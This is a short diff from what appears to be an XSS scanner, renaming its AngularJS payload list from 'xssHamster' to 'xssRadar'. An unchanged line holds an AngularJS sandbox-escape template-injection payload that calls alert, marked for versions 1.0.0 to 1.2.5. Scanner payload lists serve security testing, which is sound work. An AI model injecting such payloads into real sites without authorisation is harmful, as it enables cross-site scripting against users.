@@ -1,4 +1,4 @@
-xssHamster.scanner.payloads.angular = [
+xssRadar.scanner.payloads.angular = [
 //1.0.0 - 1.2.5
 "{{constructor.constructor('alert({id})')()}}",
 //1.2.6 - 1.2.18
